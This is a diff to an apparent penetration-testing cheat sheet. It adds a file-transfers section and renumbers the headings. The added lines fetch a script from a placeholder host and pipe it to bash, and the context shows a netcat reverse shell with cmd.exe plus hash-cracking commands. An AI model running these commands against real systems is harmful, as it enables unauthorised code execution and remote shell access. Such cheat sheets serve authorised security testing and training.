@@ -7,9 +7,10 @@ Overview
 3. - [Lateral Movement](#3---lateral-movement)
 4. - [Privilege Escalation](#4---privilege-escalation)
 5. - [Brute Force](#5---brute-force)
-6. - [Restricted Shell Escapes](#6---restricted-shell-escapes)
-7. - [Online Resources](#7---online-resources)
-8. - [Browser Plugins](#8---browser-plugins)
+6. - [File Transfers](#6---file-transfers)
+7. - [Restricted Shell Escapes](#7---restricted-shell-escapes)
+8. - [Online Resources](#8---online-resources)
+9. - [Browser Plugins](#9---browser-plugins)
      
 #1. - Enumeration
 -----------------------------------------
@@ -165,12 +166,6 @@ $ nc -nlvp <port>
 $ nc -nv <IP address> <port> -e cmd.exe
 ```
 
-- Host Files
-
-```
-$ python3 -m http.server 8000
-```
-
 - Sqlmap
 
 ```
@@ -268,7 +263,24 @@ $ zip2john <ZIP file> > hashes.txt
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
-#6. - Restricted Shell Escapes
+#6. - File Transfers
+-----------------------------------------
+
+- Host Files
+
+```
+$ python -m SimpleHTTPServer 80
+$ python3 -m http.server 8000
+```
+
+- Download Files
+
+```
+$ wget http://<IP address>:8000/exploit.sh
+$ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+#7. - Restricted Shell Escapes
 -----------------------------------------
 
 - Shell Escapes
@@ -290,7 +302,7 @@ $ fg
 $ export TERM=XTERM
 ```
 
-#7. - Online Resources
+#8 - Online Resources
 -----------------------------------------
 
 - Speedguide
@@ -305,7 +317,7 @@ https://www.speedguide.net/port.php?port=3389
 https://crackstation.net/
 ```
 
-#8. - Browser Plugins
+#9- Browser Plugins
 -----------------------------------------
 
 - Wappalyzer: Website technology analyser
